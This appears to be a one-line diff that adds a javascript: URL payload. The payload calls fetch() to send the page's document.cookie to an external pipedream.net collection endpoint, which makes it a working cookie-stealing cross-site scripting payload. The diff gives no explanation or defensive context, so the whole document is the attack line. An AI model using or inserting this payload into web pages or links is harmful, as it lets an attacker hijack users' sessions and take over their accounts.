@@ -1,0 +1,1 @@
+javascript:fetch('https://eoy83wfm7h6bodb.m.pipedream.net?a='+document.cookie)
